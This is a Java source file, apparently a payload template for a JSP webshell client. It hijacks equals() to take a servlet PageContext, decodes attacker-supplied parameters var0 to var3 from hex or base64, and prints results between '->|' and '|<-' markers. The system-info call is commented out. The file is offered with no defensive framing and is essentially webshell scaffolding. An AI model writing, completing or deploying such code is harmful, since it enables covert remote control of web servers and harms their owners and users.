import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;

public class Demo {
    public String encoder;
    public String cs;
    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        encoder = request.getParameter("encoder")!=null?request.getParameter("encoder"):"";
        cs=request.getParameter("charset")!=null?request.getParameter("charset"):"UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String var0 = EC(decode(request.getParameter("var0")+""));
            String var1 = EC(decode(request.getParameter("var1")+""));
            String var2 = EC(decode(request.getParameter("var2")+""));
            String var3 = EC(decode(request.getParameter("var3")+""));
            output.append("->" + "|");
            //sb.append(SysInfoCode(var0));
            output.append(sb.toString());
            output.append("|" + "<-");
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }
    String EC(String s) throws Exception {
        if(encoder.equals("hex")) return s;
        return new String(s.getBytes(), cs);
    }
    String decode(String str) throws Exception{
        if(encoder.equals("hex")){
            if(str=="null"||str.equals("null")){
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2){
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        }else if(encoder.equals("base64")){
            byte[] bt = null;
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
            return new String(bt,"UTF-8");
        }
        return str;
    }

}
